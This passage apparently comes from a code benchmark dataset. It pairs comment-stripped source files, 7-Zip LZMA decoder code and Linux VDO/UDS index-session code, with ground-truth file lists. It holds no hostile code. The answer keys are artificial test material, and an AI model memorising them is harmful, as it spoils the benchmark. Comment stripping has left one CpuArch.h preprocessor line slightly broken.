inStream, outBufCur, outSizeCur, allocMain));\n\n      }\n\n      #ifndef _7Z_NO_METHOD_LZMA2\n\n      else if (coder->MethodID == k_LZMA2)\n\n      {\n\n        RINOK(SzDecodeLzma2(propsData + coder->PropsOffset, coder->PropsSize, inSize, inStream, outBufCur, outSizeCur, allocMain));\n\n      }\n\n      #endif\n\n      #ifdef _7ZIP_PPMD_SUPPPORT\n\n      else if (coder->MethodID == k_PPMD)\n\n      {\n\n        RINOK(SzDecodePpmd(propsData + coder->PropsOffset, coder->PropsSize, inSize, inStream, outBufCur, outSizeCur, allocMain));\n\n      }\n\n      #endif\n\n      else\n\n        return SZ_ERROR_UNSUPPORTED;\n\n    }\n\n    else if (coder->MethodID == k_BCJ2)\n\n    {\n\n      UInt64 offset = packPositions[1];\n\n      UInt64 s3Size = packPositions[2] - offset;\n\n\n\n      if (ci != 3)\n\n        return SZ_ERROR_UNSUPPORTED;\n\n\n\n      tempSizes[2] = (SizeT)s3Size;\n\n      if (tempSizes[2] != s3Size)\n\n        return SZ_ERROR_MEM;\n\n      tempBuf[2] = (Byte *)IAlloc_Alloc(allocMain, tempSizes[2]);\n\n      if (!tempBuf[2] && tempSizes[2] != 0)\n\n        return SZ_ERROR_MEM;\n\n\n\n      RINOK(LookInStream_SeekTo(inStream, startPos + offset));\n\n      RINOK(SzDecodeCopy(s3Size, inStream, tempBuf[2]));\n\n\n\n      if ((tempSizes[0] & 3) != 0 ||\n\n          (tempSizes[1] & 3) != 0 ||\n\n          tempSize3 + tempSizes[0] + tempSizes[1] != outSize)\n\n        return SZ_ERROR_DATA;\n\n\n\n      {\n\n        CBcj2Dec p;\n\n\n\n        p.bufs[0] = tempBuf3;   p.lims[0] = tempBuf3 + tempSize3;\n\n        p.bufs[1] = tempBuf[0]; p.lims[1] = tempBuf[0] + tempSizes[0];\n\n        p.bufs[2] = tempBuf[1]; p.lims[2] = tempBuf[1] + tempSizes[1];\n\n        p.bufs[3] = tempBuf[2]; p.lims[3] = tempBuf[2] + tempSizes[2];\n\n\n\n        p.dest = outBuffer;\n\n        p.destLim = outBuffer + outSize;\n\n\n\n        Bcj2Dec_Init(&p);\n\n        RINOK(Bcj2Dec_Decode(&p));\n\n\n\n        {\n\n          unsigned i;\n\n          for (i = 0; i < 4; i++)\n\n            if (p.bufs[i] != p.lims[i])\n\n              return SZ_ERROR_DATA;\n\n\n\n          if (!Bcj2Dec_IsFinished(&p))\n\n            return SZ_ERROR_DATA;\n\n\n\n          if (p.dest != p.destLim\n\n             || p.state != BCJ2_STREAM_MAIN)\n\n            return SZ_ERROR_DATA;\n\n        }\n\n      }\n\n    }\n\n    #ifndef _7Z_NO_METHODS_FILTERS\n\n    else if (ci == 1)\n\n    {\n\n      if (coder->MethodID == k_Delta)\n\n      {\n\n        if (coder->PropsSize != 1)\n\n          return SZ_ERROR_UNSUPPORTED;\n\n        {\n\n          Byte state[DELTA_STATE_SIZE];\n\n          Delta_Init(state);\n\n          Delta_Decode(state, (unsigned)(propsData[coder->PropsOffset]) + 1, outBuffer, outSize);\n\n        }\n\n      }\n\n      else\n\n      {\n\n        if (coder->PropsSize != 0)\n\n          return SZ_ERROR_UNSUPPORTED;\n\n        switch (coder->MethodID)\n\n        {\n\n          case k_BCJ:\n\n          {\n\n            UInt32 state;\n\n            x86_Convert_Init(state);\n\n            x86_Convert(outBuffer, outSize, 0, &state, 0);\n\n            break;\n\n          }\n\n          CASE_BRA_CONV(PPC)\n\n          CASE_BRA_CONV(IA64)\n\n          CASE_BRA_CONV(SPARC)\n\n          CASE_BRA_CONV(ARM)\n\n          CASE_BRA_CONV(ARMT)\n\n          default:\n\n            return SZ_ERROR_UNSUPPORTED;\n\n        }\n\n      }\n\n    }\n\n    #endif\n\n    else\n\n      return SZ_ERROR_UNSUPPORTED;\n\n  }\n\n\n\n  return SZ_OK;\n\n}\n\n\n\n\n\nSRes SzAr_DecodeFolder(const CSzAr *p, UInt32 folderIndex,\n\n    ILookInStream *inStream, UInt64 startPos,\n\n    Byte *outBuffer, size_t outSize,\n\n    ISzAlloc *allocMain)\n\n{\n\n  SRes res;\n\n  CSzFolder folder;\n\n  CSzData sd;\n\n\n\n  const Byte *data = p->CodersData + p->FoCodersOffsets[folderIndex];\n\n  sd.Data = data;\n\n  sd.Size = p->FoCodersOffsets[folderIndex + 1] - p->FoCodersOffsets[folderIndex];\n\n\n\n  res = SzGetNextFolderItem(&folder, &sd);\n\n\n\n  if (res != SZ_OK)\n\n    return res;\n\n\n\n  if (sd.Size != 0\n\n      || folder.UnpackStream != p->FoToMainUnpackSizeIndex[folderIndex]\n\n      || outSize != SzAr_GetFolderUnpackSize(p, folderIndex))\n\n    return SZ_ERROR_FAIL;\n\n  {\n\n    unsigned i;\n\n    Byte *tempBuf[3] = { 0, 0, 0};\n\n\n\n    res = SzFolder_Decode2(&folder, data,\n\n        &p->CoderUnpackSizes[p->FoToCoderUnpackSizes[folderIndex]],\n\n        p->PackPositions + p->FoStartPackStreamIndex[folderIndex],\n\n        inStream, startPos,\n\n        outBuffer, (SizeT)outSize, allocMain, tempBuf);\n\n\n\n    for (i = 0; i < 3; i++)\n\n      IAlloc_Free(allocMain, tempBuf[i]);\n\n\n\n    if (res == SZ_OK)\n\n      if (SzBitWithVals_Check(&p->FolderCRCs, folderIndex))\n\n        if (CrcCalc(outBuffer, outSize) != p->FolderCRCs.Vals[folderIndex])\n\n          res = SZ_ERROR_CRC;\n\n\n\n    return res;\n\n  }\n\n}\n\n\n'TSF/include/lzma/Ppmd.h'\n:\n\n\n\n#ifndef __PPMD_H\n\n#define __PPMD_H\n\n\n\n#include \"CpuArch.h\"\n\n\n\nEXTERN_C_BEGIN\n\n\n\n#ifdef MY_CPU_32BIT\n\n  #define PPMD_32BIT\n\n#endif\n\n\n\n#define PPMD_INT_BITS 7\n\n#define PPMD_PERIOD_BITS 7\n\n#define PPMD_BIN_SCALE (1 << (PPMD_INT_BITS + PPMD_PERIOD_BITS))\n\n\n\n#define PPMD_GET_MEAN_SPEC(summ, shift, round) (((summ) + (1 << ((shift) - (round)))) >> (shift))\n\n#define PPMD_GET_MEAN(summ) PPMD_GET_MEAN_SPEC((summ), PPMD_PERIOD_BITS, 2)\n\n#define PPMD_UPDATE_PROB_0(prob) ((prob) + (1 << PPMD_INT_BITS) - PPMD_GET_MEAN(prob))\n\n#define PPMD_UPDATE_PROB_1(prob) ((prob) - PPMD_GET_MEAN(prob))\n\n\n\n#define PPMD_N1 4\n\n#define PPMD_N2 4\n\n#define PPMD_N3 4\n\n#define PPMD_N4 ((128 + 3 - 1 * PPMD_N1 - 2 * PPMD_N2 - 3 * PPMD_N3) / 4)\n\n#define PPMD_NUM_INDEXES (PPMD_N1 + PPMD_N2 + PPMD_N3 + PPMD_N4)\n\n\n\n#pragma pack(push, 1)\n\n\n\n\n\n\n\ntypedef struct\n\n{\n\n  UInt16 Summ;\n\n  Byte Shift;\n\n  Byte Count;\n\n} CPpmd_See;\n\n\n\n#define Ppmd_See_Update(p)  if ((p)->Shift < PPMD_PERIOD_BITS && --(p)->Count == 0) \\\n\n    { (p)->Summ <<= 1; (p)->Count = (Byte)(3 << (p)->Shift++); }\n\n\n\ntypedef struct\n\n{\n\n  Byte Symbol;\n\n  Byte Freq;\n\n  UInt16 SuccessorLow;\n\n  UInt16 SuccessorHigh;\n\n} CPpmd_State;\n\n\n\n#pragma pack(pop)\n\n\n\ntypedef\n\n  #ifdef PPMD_32BIT\n\n    CPpmd_State *\n\n  #else\n\n    UInt32\n\n  #endif\n\n  CPpmd_State_Ref;\n\n\n\ntypedef\n\n  #ifdef PPMD_32BIT\n\n    void *\n\n  #else\n\n    UInt32\n\n  #endif\n\n  CPpmd_Void_Ref;\n\n\n\ntypedef\n\n  #ifdef PPMD_32BIT\n\n    Byte *\n\n  #else\n\n    UInt32\n\n  #endif\n\n  CPpmd_Byte_Ref;\n\n\n\n#define PPMD_SetAllBitsIn256Bytes(p) \\\n\n  { unsigned z; for (z = 0; z < 256 / sizeof(p[0]); z += 8) { \\\n\n  p[z+7] = p[z+6] = p[z+5] = p[z+4] = p[z+3] = p[z+2] = p[z+1] = p[z+0] = ~(size_t)0; }}\n\n\n\nEXTERN_C_END\n\n\n\n#endif\n\n\n'TSF/include/lzma/CpuArch.h'\n:\n\n\n\n#ifndef __CPU_ARCH_H\n\n#define __CPU_ARCH_H\n\n\n\n#include \"7zTypes.h\"\n\n\n\nEXTERN_C_BEGIN\n\n\n\n\n\n\n\n#if defined(_M_X64) \\\n\n   || defined(_M_AMD64) \\\n\n   || defined(__x86_64__) \\\n\n   || defined(__AMD64__) \\\n\n   || defined(__amd64__)\n\n  #define MY_CPU_AMD64\n\n#endif\n\n\n\n#if defined(MY_CPU_AMD64) \\\n\n    || defined(_M_IA64) \\\n\n    || defined(__AARCH64EL__) \\\n\n    || defined(__AARCH64EB__)\n\n  #define MY_CPU_64BIT\n\n#endif\n\n\n\n#if defined(_M_IX86) || defined(__i386__)\n\n#define MY_CPU_X86\n\n#endif\n\n\n\n#if defined(MY_CPU_X86) || defined(MY_CPU_AMD64)\n\n#define MY_CPU_X86_OR_AMD64\n\n#endif\n\n\n\n#if defined(MY_CPU_X86) \\\n\n    || defined(_M_ARM) \\\n\n    || defined(__ARMEL__) \\\n\n    || defined(__THUMBEL__) \\\n\n    || defined(__ARMEB__) \\\n\n    || defined(__THUMBEB__)\n\n  #define MY_CPU_32BIT\n\n#endif\n\n\n\n#if defined(_WIN32) && defined(_M_ARM)\n\n#define MY_CPU_ARM_LE\n\n#endif\n\n\n\n#if defined(_WIN32) && defined(_M_IA64)\n\n#define MY_CPU_IA64_LE\n\n#endif\n\n\n\n#if defined(MY_CPU_X86_OR_AMD64) \\\n\n    || defined(MY_CPU_ARM_LE) \\\n\n    || defined(MY_CPU_IA64_LE) \\\n\n    || defined(__LITTLE_ENDIAN__) \\\n\n    || defined(__ARMEL__) \\\n\n    || defined(__THUMBEL__) \\\n\n    || defined(__AARCH64EL__) \\\n\n    || defined(__MIPSEL__) \\\n\n    || defined(__MIPSEL) \\\n\n    || defined(_MIPSEL) \\\n\n    || (defined(__BYTE_ORDER__) && (__BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__))\n\n  #define MY_CPU_LE\n\n#endif\n\n\n\n#if defined(__BIG_ENDIAN__) \\\n\n    || defined(__ARMEB__) \\\n\n    || defined(__THUMBEB__) \\\n\n    || defined(__AARCH64EB__) \\\n\n    || defined(__MIPSEB__) \\\n\n    || defined(__MIPSEB) \\\n\n    || defined(_MIPSEB) \\\n\n    || defined(__m68k__) \\\n\n    || defined(__s390__) \\\n\n    || defined(__s390x__) \\\n\n    || defined(__zarch__) \\\n\n    || (defined(__BYTE_ORDER__) && (__BYTE_ORDER__ == __ORDER_BIG_ENDIAN__))\n\n  #define MY_CPU_BE\n\n#endif\n\n\n\n#if defined(MY_CPU_LE) && defined(MY_CPU_BE)\n\nStop_Compiling_Bad_Endian\n\n#endif\n\n\n\n\n\n#ifdef MY_CPU_LE\n\n  #if defined(MY_CPU_X86_OR_AMD64) \\\n\n\n\n    #define MY_CPU_LE_UNALIGN\n\n  #endif\n\n#endif\n\n\n\n\n\n#ifdef MY_CPU_LE_UNALIGN\n\n\n\n#define GetUi16(p) (*(const UInt16 *)(const void *)(p))\n\n#define GetUi32(p) (*(const UInt32 *)(const void *)(p))\n\n#define GetUi64(p) (*(const UInt64 *)(const void *)(p))\n\n\n\n#define SetUi16(p, v) { *(UInt16 *)(p) = (v); }\n\n#define SetUi32(p, v) { *(UInt32 *)(p) = (v); }\n\n#define SetUi64(p, v) { *(UInt64 *)(p) = (v); }\n\n\n\n#else\n\n\n\n#define GetUi16(p) ( (UInt16) ( \\\n\n             ((const Byte *)(p))[0] | \\\n\n    ((UInt16)((const Byte *)(p))[1] << 8) ))\n\n\n\n#define GetUi32(p) ( \\\n\n             ((const Byte *)(p))[0]        | \\\n\n    ((UInt32)((const Byte *)(p))[1] <<  8) | \\\n\n    ((UInt32)((const Byte *)(p))[2] << 16) | \\\n\n    ((UInt32)((const Byte *)(p))[3] << 24))\n\n\n\n#define GetUi64(p) (GetUi32(p) | ((UInt64)GetUi32(((const Byte *)(p)) + 4) << 32))\n\n\n\n#define SetUi16(p, v) { Byte *_ppp_ = (Byte *)(p); UInt32 _vvv_ = (v); \\\n\n    _ppp_[0] = (Byte)_vvv_; \\\n\n    _ppp_[1] = (Byte)(_vvv_ >> 8); }\n\n\n\n#define SetUi32(p, v) { Byte *_ppp_ = (Byte *)(p); UInt32 _vvv_ = (v); \\\n\n    _ppp_[0] = (Byte)_vvv_; \\\n\n    _ppp_[1] = (Byte)(_vvv_ >> 8); \\\n\n    _ppp_[2] = (Byte)(_vvv_ >> 16); \\\n\n    _ppp_[3] = (Byte)(_vvv_ >> 24); }\n\n\n\n#define SetUi64(p, v) { Byte *_ppp2_ = (Byte *)(p); UInt64 _vvv2_ = (v); \\\n\n    SetUi32(_ppp2_    , (UInt32)_vvv2_); \\\n\n    SetUi32(_ppp2_ + 4, (UInt32)(_vvv2_ >> 32)); }\n\n\n\n#endif\n\n\n\n\n\n#if defined(MY_CPU_LE_UNALIGN) &&  (_MSC_VER >= 1300)\n\n\n\n\n\n\n\n#include <stdlib.h>\n\n\n\n#pragma intrinsic(_byteswap_ulong)\n\n#pragma intrinsic(_byteswap_uint64)\n\n#define GetBe32(p) _byteswap_ulong(*(const UInt32 *)(const Byte *)(p))\n\n#define GetBe64(p) _byteswap_uint64(*(const UInt64 *)(const Byte *)(p))\n\n\n\n#define SetBe32(p, v) (*(UInt32 *)(void *)(p)) = _byteswap_ulong(v)\n\n\n\n#elif defined(MY_CPU_LE_UNALIGN) && defined (__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))\n\n\n\n#define GetBe32(p) __builtin_bswap32(*(const UInt32 *)(const Byte *)(p))\n\n#define GetBe64(p) __builtin_bswap64(*(const UInt64 *)(const Byte *)(p))\n\n\n\n#define SetBe32(p, v) (*(UInt32 *)(void *)(p)) = __builtin_bswap32(v)\n\n\n\n#else\n\n\n\n#define GetBe32(p) ( \\\n\n    ((UInt32)((const Byte *)(p))[0] << 24) | \\\n\n    ((UInt32)((const Byte *)(p))[1] << 16) | \\\n\n    ((UInt32)((const Byte *)(p))[2] <<  8) | \\\n\n             ((const Byte *)(p))[3] )\n\n\n\n#define GetBe64(p) (((UInt64)GetBe32(p) << 32) | GetBe32(((const Byte *)(p)) + 4))\n\n\n\n#define SetBe32(p, v) { Byte *_ppp_ = (Byte *)(p); UInt32 _vvv_ = (v); \\\n\n    _ppp_[0] = (Byte)(_vvv_ >> 24); \\\n\n    _ppp_[1] = (Byte)(_vvv_ >> 16); \\\n\n    _ppp_[2] = (Byte)(_vvv_ >> 8); \\\n\n    _ppp_[3] = (Byte)_vvv_; }\n\n\n\n#endif\n\n\n\n\n\n#define GetBe16(p) ( (UInt16) ( \\\n\n    ((UInt16)((const Byte *)(p))[0] << 8) | \\\n\n             ((const Byte *)(p))[1] ))\n\n\n\n\n\n\n\n#ifdef MY_CPU_X86_OR_AMD64\n\n\n\ntypedef struct\n\n{\n\n  UInt32 maxFunc;\n\n  UInt32 vendor[3];\n\n  UInt32 ver;\n\n  UInt32 b;\n\n  UInt32 c;\n\n  UInt32 d;\n\n} Cx86cpuid;\n\n\n\nenum\n\n{\n\n  CPU_FIRM_INTEL,\n\n  CPU_FIRM_AMD,\n\n  CPU_FIRM_VIA\n\n};\n\n\n\nvoid MyCPUID(UInt32 function, UInt32 *a, UInt32 *b, UInt32 *c, UInt32 *d);\n\n\n\nBool x86cpuid_CheckAndRead(Cx86cpuid *p);\n\nint x86cpuid_GetFirm(const Cx86cpuid *p);\n\n\n\n#define x86cpuid_GetFamily(ver) (((ver >> 16) & 0xFF0) | ((ver >> 8) & 0xF))\n\n#define x86cpuid_GetModel(ver)  (((ver >> 12) &  0xF0) | ((ver >> 4) & 0xF))\n\n#define x86cpuid_GetStepping(ver) (ver & 0xF)\n\n\n\nBool CPU_Is_InOrder();\n\nBool CPU_Is_Aes_Supported();\n\n\n\n#endif\n\n\n\nEXTERN_C_END\n\n\n\n#endif\n\n",
        "gt": [
            "'TSF/include/lzma/CpuArch.h'",
            "'TSF/include/lzma/Ppmd.h'",
            "'TSF/include/lzma/Ppmd7.h'",
            "'TSF/src/lzma/7zDec.c'"
        ]
    },
    {
        "files": [
            "'vdo/utils/uds/index-session.h'",
            "'vdo/utils/uds/config.h'",
            "'vdo/utils/uds/index-session.c'"
        ],
        "content": "'vdo/utils/uds/index-session.h'\n:\n\n\n#ifndef UDS_INDEX_SESSION_H\n#define UDS_INDEX_SESSION_H\n\n#include <linux/atomic.h>\n#include <linux/cache.h>\n\n#include \"thread-utils.h\"\n\n#include \"config.h\"\n#include \"indexer.h\"\n\n\n\nstruct __aligned(L1_CACHE_BYTES) session_stats {\n\n\tu64 posts_found;\n\n\tu64 posts_found_open_chapter;\n\n\tu64 posts_found_dense;\n\n\tu64 posts_found_sparse;\n\n\tu64 posts_not_found;\n\n\tu64 updates_found;\n\n\tu64 updates_not_found;\n\n\tu64 deletions_found;\n\n\tu64 deletions_not_found;\n\n\tu64 queries_found;\n\n\tu64 queries_not_found;\n\n\tu64 requests;\n};\n\nenum index_suspend_status {\n\n\tINDEX_OPENING = 0,\n\n\tINDEX_READY,\n\n\tINDEX_SUSPENDING,\n\n\tINDEX_SUSPENDED,\n\n\tINDEX_FREEING,\n};\n\nstruct index_load_context {\n\tstruct mutex mutex;\n\tstruct cond_var cond;\n\tenum index_suspend_status status;\n};\n\nstruct uds_index_session {\n\tunsigned int state;\n\tstruct uds_index *index;\n\tstruct uds_request_queue *callback_queue;\n\tstruct uds_parameters parameters;\n\tstruct index_load_context load_context;\n\tstruct mutex request_mutex;\n\tstruct cond_var request_cond;\n\tint request_count;\n\tstruct session_stats stats;\n};\n\n#endif\n\n'vdo/utils/uds/config.h'\n:\n\n\n#ifndef UDS_CONFIG_H\n#define UDS_CONFIG_H\n\n#include \"geometry.h\"\n#include \"indexer.h\"\n#include \"io-factory.h\"\n\n\n\nenum {\n\tDEFAULT_VOLUME_INDEX_MEAN_DELTA = 4096,\n\tDEFAULT_CACHE_CHAPTERS = 7,\n\tDEFAULT_SPARSE_SAMPLE_RATE = 32,\n\tMAX_ZONES = 16,\n};\n\n\nstruct uds_configuration {\n\n\tstruct block_device *bdev;\n\n\n\tsize_t size;\n\n\n\toff_t offset;\n\n\n\n\n\tstruct index_geometry *geometry;\n\n\n\tu64 nonce;\n\n\n\tunsigned int zone_count;\n\n\n\tunsigned int read_threads;\n\n\n\tu32 cache_chapters;\n\n\n\n\n\tu32 volume_index_mean_delta;\n\n\n\tu32 sparse_sample_rate;\n};\n\n\nstruct uds_configuration_8_02 {\n\n\tu32 record_pages_per_chapter;\n\n\tu32 chapters_per_volume;\n\n\tu32 sparse_chapters_per_volume;\n\n\tu32 cache_chapters;\n\n\tu32 unused;\n\n\tu32 volume_index_mean_delta;\n\n\tu32 bytes_per_page;\n\n\tu32 sparse_sample_rate;\n\n\tu64 nonce;\n\n\tu64 remapped_virtual;\n\n\tu64 remapped_physical;\n} __packed;\n\n\nstruct uds_configuration_6_02 {\n\n\tu32 record_pages_per_chapter;\n\n\tu32 chapters_per_volume;\n\n\tu32 sparse_chapters_per_volume;\n\n\tu32 cache_chapters;\n\n\tu32 unused;\n\n\tu32 volume_index_mean_delta;\n\n\tu32 bytes_per_page;\n\n\tu32 sparse_sample_rate;\n\n\tu64 nonce;\n} __packed;\n\nint __must_check uds_make_configuration(const struct uds_parameters *params,\n\t\t\t\t\tstruct uds_configuration **config_ptr);\n\nvoid uds_free_configuration(struct uds_configuration *config);\n\nint __must_check uds_validate_config_contents(struct buffered_reader *reader,\n\t\t\t\t\t      struct uds_configuration *config);\n\nint __must_check uds_write_config_contents(struct buffered_writer *writer,\n\t\t\t\t\t   struct uds_configuration *config, u32 version);\n\nvoid uds_log_configuration(struct uds_configuration *config);\n\n#endif\n\n'vdo/utils/uds/index-session.c'\n:\n\n\n#include \"index-session.h\"\n\n#include <linux/atomic.h>\n\n#include \"logger.h\"\n#include \"memory-alloc.h\"\n#include \"time-utils.h\"\n\n#include \"funnel-requestqueue.h\"\n#include \"index.h\"\n#include \"index-layout.h\"\n\n\n\nenum index_session_flag_bit {\n\tIS_FLAG_BIT_START = 8,\n\n\tIS_FLAG_BIT_LOADING = IS_FLAG_BIT_START,\n\n\tIS_FLAG_BIT_LOADED,\n\n\tIS_FLAG_BIT_DISABLED,\n\n\tIS_FLAG_BIT_SUSPENDED,\n\n\tIS_FLAG_BIT_WAITING,\n\n\tIS_FLAG_BIT_CLOSING,\n\n\tIS_FLAG_BIT_DESTROYING,\n};\n\nenum index_session_flag {\n\tIS_FLAG_LOADED = (1 << IS_FLAG_BIT_LOADED),\n\tIS_FLAG_LOADING = (1 << IS_FLAG_BIT_LOADING),\n\tIS_FLAG_DISABLED = (1 << IS_FLAG_BIT_DISABLED),\n\tIS_FLAG_SUSPENDED = (1 << IS_FLAG_BIT_SUSPENDED),\n\tIS_FLAG_WAITING = (1 << IS_FLAG_BIT_WAITING),\n\tIS_FLAG_CLOSING = (1 << IS_FLAG_BIT_CLOSING),\n\tIS_FLAG_DESTROYING = (1 << IS_FLAG_BIT_DESTROYING),\n};\n\n\nstatic void release_index_session(struct uds_index_session *index_session)\n{\n\tmutex_lock(&index_session->request_mutex);\n\tif (--index_session->request_count == 0)\n\t\tuds_broadcast_cond(&index_session->request_cond);\n\tmutex_unlock(&index_session->request_mutex);\n}\n\n\nstatic int get_index_session(struct uds_index_session *index_session)\n{\n\tunsigned int state;\n\tint result = UDS_SUCCESS;\n\n\tmutex_lock(&index_session->request_mutex);\n\tindex_session->request_count++;\n\tstate = index_session->state;\n\tmutex_unlock(&index_session->request_mutex);\n\n\tif (state == IS_FLAG_LOADED) {\n\t\treturn UDS_SUCCESS;\n\t} else if (state & IS_FLAG_DISABLED) {\n\t\tresult = UDS_DISABLED;\n\t} else if ((state & IS_FLAG_LOADING) ||\n\t\t   (state & IS_FLAG_SUSPENDED) ||\n\t\t   (state & IS_FLAG_WAITING)) {\n\t\tresult = -EBUSY;\n\t} else {\n\t\tresult = UDS_NO_INDEX;\n\t}\n\n\trelease_index_session(index_session);\n\treturn result;\n}\n\nint uds_launch_request(struct uds_request *request)\n{\n\tsize_t internal_size;\n\tint result;\n\n\tif (request->callback == NULL) {\n\t\tvdo_log_error(\"missing required callback\");\n\t\treturn -EINVAL;\n\t}\n\n\tswitch (request->type) {\n\tcase UDS_DELETE:\n\tcase UDS_POST:\n\tcase UDS_QUERY:\n\tcase UDS_QUERY_NO_UPDATE:\n\tcase UDS_UPDATE:\n\t\tbreak;\n\tdefault:\n\t\tvdo_log_error(\"received invalid callback type\");\n\t\treturn -EINVAL;\n\t}\n\n\n\tinternal_size =\n\t\tsizeof(struct uds_request) - offsetof(struct uds_request, zone_number);\n\n\tmemset((char *) request + sizeof(*request) - internal_size, 0, internal_size);\n\n\tresult = get_index_session(request->session);\n\tif (result != UDS_SUCCESS)\n\t\treturn result;\n\n\trequest->found = false;\n\trequest->unbatched = false;\n\trequest->index = request->session->index;\n\n\tuds_enqueue_request(request, STAGE_TRIAGE);\n\treturn UDS_SUCCESS;\n}\n\nstatic void enter_callback_stage(struct uds_request *request)\n{\n\tif (request->status != UDS_SUCCESS) {\n\n\t\tmutex_lock(&request->session->request_mutex);\n\t\trequest->session->state |= IS_FLAG_DISABLED;\n\t\tmutex_unlock(&request->session->request_mutex);\n\t}\n\n\tuds_request_queue_enqueue(request->session->callback_queue, request);\n}\n\nstatic inline void count_once(u64 *count_ptr)\n{\n\tWRITE_ONCE(*count_ptr, READ_ONCE(*count_ptr) + 1);\n}\n\nstatic void update_session_stats(struct uds_request *request)\n{\n\tstruct session_stats *session_stats = &request->session->stats;\n\n\tcount_once(&session_stats->requests);\n\n\tswitch (request->type) {\n\tcase UDS_POST:\n\t\tif (request->found)\n\t\t\tcount_once(&session_stats->posts_found);\n\t\telse\n\t\t\tcount_once(&session_stats->posts_not_found);\n\n\t\tif (request->location == UDS_LOCATION_IN_OPEN_CHAPTER)\n\t\t\tcount_once(&session_stats->posts_found_open_chapter);\n\t\telse if (request->location == UDS_LOCATION_IN_DENSE)\n\t\t\tcount_once(&session_stats->posts_found_dense);\n\t\telse if (request->location == UDS_LOCATION_IN_SPARSE)\n\t\t\tcount_once(&session_stats->posts_found_sparse);\n\t\tbreak;\n\n\tcase UDS_UPDATE:\n\t\tif (request->found)\n\t\t\tcount_once(&session_stats->updates_found);\n\t\telse\n\t\t\tcount_once(&session_stats->updates_not_found);\n\t\tbreak;\n\n\tcase UDS_DELETE:\n\t\tif (request->found)\n\t\t\tcount_once(&session_stats->deletions_found);\n\t\telse\n\t\t\tcount_once(&session_stats->deletions_not_found);\n\t\tbreak;\n\n\tcase UDS_QUERY:\n\tcase UDS_QUERY_NO_UPDATE:\n\t\tif (request->found)\n\t\t\tcount_once(&session_stats->queries_found);\n\t\telse\n\t\t\tcount_once(&session_stats->queries_not_found);\n\t\tbreak;\n\n\tdefault:\n\t\trequest->status = VDO_ASSERT(false, \"unknown request type: %d\",\n\t\t\t\t\t     request->type);\n\t}\n}\n\nstatic void handle_callbacks(struct uds_request *request)\n{\n\tstruct uds_index_session *index_session = request->session;\n\n\tif (request->status == UDS_SUCCESS)\n\t\tupdate_session_stats(request);\n\n\trequest->status = uds_status_to_errno(request->status);\n\trequest->callback(request);\n\trelease_index_session(index_session);\n}\n\nstatic int __must_check make_empty_index_session(struct uds_index_session **index_session_ptr)\n{\n\tint result;\n\tstruct uds_index_session *session;\n\n\tresult = vdo_allocate(1, struct uds_index_session, __func__, &session);\n\tif (result != VDO_SUCCESS)\n\t\treturn result;\n\n\tmutex_init(&session->request_mutex);\n\tuds_init_cond(&session->request_cond);\n\tmutex_init(&session->load_context.mutex);\n\tuds_init_cond(&session->load_context.cond);\n\n\tresult = uds_make_request_queue(\"callbackW\", &handle_callbacks,\n\t\t\t\t\t&session->callback_queue);\n\tif (result != UDS_SUCCESS) {\n\t\tuds_destroy_cond(&session->load_context.cond);\n\t\tmutex_destroy(&session->load_context.mutex);\n\t\tuds_destroy_cond(&session->request_cond);\n\t\tmutex_destroy(&session->request_mutex);\n\t\tvdo_free(session);\n\t\treturn result;\n\t}\n\n\t*index_session_ptr = session;\n\treturn UDS_SUCCESS;\n}\n\nint uds_create_index_session(struct uds_index_session **session)\n{\n\tif (session == NULL) {\n\t\tvdo_log_error(\"missing session pointer\");\n\t\treturn -EINVAL;\n\t}\n\n\treturn uds_status_to_errno(make_empty_index_session(session));\n}\n\nstatic int __must_check start_loading_index_session(struct uds_index_session *index_session)\n{\n\tint result;\n\n\tmutex_lock(&index_session->request_mutex);\n\tif (index_session->state & IS_FLAG_SUSPENDED) {\n\t\tvdo_log_info(\"Index session is suspended\");\n\t\tresult = -EBUSY;\n\t} else if (index_session->state != 0) {\n\t\tvdo_log_info(\"Index is already loaded\");\n\t\tresult = -EBUSY;\n\t} else {\n\t\tindex_session->state |= IS_FLAG_LOADING;\n\t\tresult = UDS_SUCCESS;\n\t}\n\tmutex_unlock(&index_session->request_mutex);\n\treturn result;\n}\n\nstatic void finish_loading_index_session(struct uds_index_session *index_session,\n\t\t\t\t\t int result)\n{\n\tmutex_lock(&index_session->request_mutex);\n\tindex_session->state &= ~IS_FLAG_LOADING;\n\tif (result == UDS_SUCCESS)\n\t\tindex_session->state |= IS_FLAG_LOADED;\n\n\tuds_broadcast_cond(&index_session->request_cond);\n\tmutex_unlock(&index_session->request_mutex);\n}\n\nstatic int initialize_index_session(struct uds_index_session *index_session,\n\t\t\t\t    enum uds_open_index_type open_type)\n{\n\tint result;\n\tstruct uds_configuration *config;\n\n\tresult = uds_make_configuration(&index_session->parameters, &config);\n\tif (result != UDS_SUCCESS) {\n\t\tvdo_log_error_strerror(result, \"Failed to allocate config\");\n\t\treturn result;\n\t}\n\n\tmemset(&index_session->stats, 0, sizeof(index_session->stats));\n\tresult = uds_make_index(config, open_type, &index_session->load_context,\n\t\t\t\tenter_callback_stage, &index_session->index);\n\tif (result != UDS_SUCCESS)\n\t\tvdo_log_error_strerror(result, \"Failed to make index\");\n\telse\n\t\tuds_log_configuration(config);\n\n\tuds_free_configuration(config);\n\treturn result;\n}\n\nstatic const char *get_open_type_string(enum uds_open_index_type open_type)\n{\n\tswitch (open_type) {\n\tcase UDS_CREATE:\n\t\treturn \"creating index\";\n\tcase UDS_LOAD:\n\t\treturn \"loading or rebuilding index\";\n\tcase UDS_NO_REBUILD:\n\t\treturn \"loading index\";\n\tdefault:\n\t\treturn \"unknown open method\";\n\t}\n}\n\n\nint uds_open_index(enum uds_open_index_type open_type,\n\t\t   const struct uds_parameters *parameters,\n\t\t   struct uds_index_session *session)\n{\n\tint result;\n\tchar name[BDEVNAME_SIZE];\n\n\tif (parameters == NULL) {\n\t\tvdo_log_error(\"missing required parameters\");\n\t\treturn -EINVAL;\n\t}\n\tif (parameters->bdev == NULL) {\n\t\tvdo_log_error(\"missing required block device\");\n\t\treturn -EINVAL;\n\t}\n\tif (session == NULL) {\n\t\tvdo_log_error(\"missing required session pointer\");\n\t\treturn -EINVAL;\n\t}\n\n\tresult = start_loading_index_session(session);\n\tif (result != UDS_SUCCESS)\n\t\treturn uds_status_to_errno(result);\n\n\tsession->parameters = *parameters;\n\tformat_dev_t(name, parameters->bdev->bd_dev);\n\tvdo_log_info(\"%s: %s\", get_open_type_string(open_type), name);\n\n\tresult = initialize_index_session(session, open_type);\n\tif (result != 